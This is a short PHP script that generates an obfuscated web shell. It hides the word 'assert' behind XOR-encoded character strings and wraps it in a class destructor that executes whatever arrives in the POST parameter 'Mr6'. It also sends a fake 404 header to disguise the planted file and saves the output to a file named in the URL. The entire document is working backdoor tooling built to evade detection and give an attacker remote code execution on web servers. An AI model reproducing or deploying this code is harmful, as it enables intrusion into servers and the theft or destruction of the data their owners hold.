<?php
//code by Mr6
error_reporting(0);
	function randomkeys($length)   
{   
   $pattern = '`~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';  
    for($i=0;$i<$length;$i++)   
    {   
        $key[$i]= $pattern{mt_rand(0,strlen($pattern)-1)};    //生成php随机数   
    }   
    return $key;   
}   
	function randname($length)   
{   
   $pattern = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';  
    for($i=0;$i<$length;$i++)   
    {   
        @$key.= $pattern{mt_rand(0,strlen($pattern)-1)};    //生成php随机数   
    }   
    return $key;   
} 
	$str=randomkeys(6); 
	$bname=randname(4);
	$lname=strrev(strtolower($bname));
	$str2="assert";
			echo "<?php \n";
			echo "header('HTTP/1.1 404');\n";
			echo "class  ".$bname."{ public \$c='';\nfunction __destruct(){\n";
	for ($i=0;$i<6;$i++)
	{
		$name="_".$i;
		$str3[$i]=bin2hex($str[$i] ^$str2[$i]);

		echo "$"."$name=";
	echo "'".$str[$i]."'"."^"."\"\\x".$str3[$i]."\";\n";
	}
	$aa='$db=$_0.$_1.$_2.$_3.$_4.$_5;';
	echo $aa;
	echo "\n";
	echo 'return @$db($this->c); }}';
	echo "\n";
	echo "\${$lname}=new {$bname}();\n";
	echo "@\${$lname}->c=\$_POST['Mr6'];\n";
	echo "?>\n";
	@$file=$_GET['file'];
	$html = ob_get_contents();
	if (isset($file))
{	if(file_put_contents($file,$html))
	echo "\n\n\n".$file."   save success!";}
	else {echo "Please input the file name like '?file=xxx.txt'";}
	?>
